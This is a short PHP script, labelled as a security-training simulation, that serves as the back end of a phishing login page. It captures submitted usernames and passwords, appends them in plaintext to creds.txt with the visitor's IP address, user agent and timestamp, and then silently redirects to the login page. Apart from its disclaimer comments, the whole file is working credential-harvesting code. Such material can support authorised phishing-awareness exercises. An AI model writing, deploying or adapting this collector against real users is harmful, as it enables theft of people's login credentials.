<?php
// Training Simulation - DO NOT USE IN PRODUCTION
// For authorized security training only

header('Content-Type: text/html; charset=utf-8');

// Configuration
$credsFile = __DIR__ . '/creds.txt';

// Get POST data
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Get client info
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Log entry
$logEntry = "[$timestamp] IP: $ip | UA: $userAgent | User: $username | Pass: $password\n";

// Write to file (append mode)
file_put_contents($credsFile, $logEntry, FILE_APPEND | LOCK_EX);

// Redirect back to login page
header('Location: index.html');
exit;
?>
